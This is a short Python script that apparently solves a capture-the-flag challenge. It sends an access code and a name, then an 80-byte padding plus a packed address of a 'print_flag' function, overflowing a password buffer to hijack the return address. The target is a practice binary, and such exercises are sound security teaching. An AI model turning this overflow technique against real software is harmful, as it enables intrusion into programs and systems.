#!/usr/bin/env python3
import struct, sys

offset = 80
addr = 0x080492d6    # print_flag

# 1) access code (must be numeric so scanf("%d") consumes it)
sys.stdout.buffer.write(b"1234\n")

# 2) name
sys.stdout.buffer.write(b"prem\n")

# 3) password (overflow)
sys.stdout.buffer.write(b"A"*offset + struct.pack("<I", addr) + b"\n")
